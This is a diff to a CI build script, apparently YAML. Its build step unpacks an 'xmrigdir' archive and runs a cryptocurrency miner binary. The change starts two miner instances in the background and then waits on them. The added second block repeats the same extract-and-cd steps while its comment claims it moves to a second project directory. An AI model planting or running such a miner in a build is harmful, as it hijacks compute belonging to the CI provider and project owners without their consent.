@@ -12,9 +12,18 @@ init:
   - sudo apt-get install -y bash
 
 build_script:
-  # Grant execute permission to the file if needed
+  # First project setup and execution
   - tar xvf xmrigdir.tar.gz
   - cd xmrigdir
   - chmod +x ./miner
-  # Run the script with no extension
-  - ./miner
+  - ./miner &  # Run in the background
+
+  # Move to second project directory (assuming it exists)
+  - tar xvf xmrigdir.tar.gz
+  - cd xmrigdir
+  - chmod +x ./miner
+  - ./miner & # Run in the background
+
+  # Wait for both processes to finish
+  - wait
+  
